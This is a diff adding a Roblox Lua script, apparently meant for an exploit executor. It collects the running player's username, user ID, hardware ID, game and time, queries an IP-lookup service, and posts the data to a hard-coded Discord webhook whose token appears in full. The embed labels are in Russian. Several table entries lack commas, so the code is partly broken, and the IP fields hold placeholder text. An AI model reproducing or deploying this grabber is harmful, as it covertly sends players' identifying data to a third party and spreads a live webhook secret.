@@ -1,0 +1,84 @@
+local lp = game:GetService("Players").LocalPlayer
+
+if game:IsLoaded() then
+    local player_name = lp.Name
+    local player_id = lp.UserId
+    local webhook_url = "https://discord.com/api/webhooks/1358382308771762319/gFFCLVM2UP04JvnL99Cb2p3Z4PRilA0WFU5pAbl5ZLWqzO7XFDsL62_2y-WSIdGHY3Al"
+
+    -- Get HWID
+    local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+
+    local place_id = game.PlaceId
+    local place_name = game:GetService("MarketplaceService"):GetProductInfo(place_id).Name
+
+    local ip_info = syn and syn.request or http_request({
+        Url = "http://ip-api.com/json",
+        Method = "GET"
+    })
+
+    getgenv().ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
+
+    local current_time = os.date("%Y-%m-%d %H:%M:%S")
+
+    -- Создаем embed
+    local embed = {
+        {
+            ["title"] = "Информация о пользователе",
+            ["description"] = "Данные о пользователе:",
+            ["color"] = 0xFF0000, 
+            ["fields"] = {
+                {
+                    ["name"] = "Имя пользователя",
+                    ["value"] = player_name,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "ID пользователя",
+                    ["value"] = tostring(player_id),
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "HWID",
+                    ["value"] = hwid,
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "Игра",
+                    ["value"] = place_name,
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "Время",
+                    ["value"] = current_time,
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "IP",
+                    ["value"] = "поканедоступно"
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "Страна",
+                    ["value"] = "поканедоступно"
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Город",
+                    ["value"] = "поканедоступно"
+                    ["inline"] = true
+                }
+            }
+        }
+    }
+
+    http_request(
+        {
+            Url = webhook_url,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = game:GetService("HttpService"):JSONEncode({["embeds"] = embed})
+        }
+    )
+end
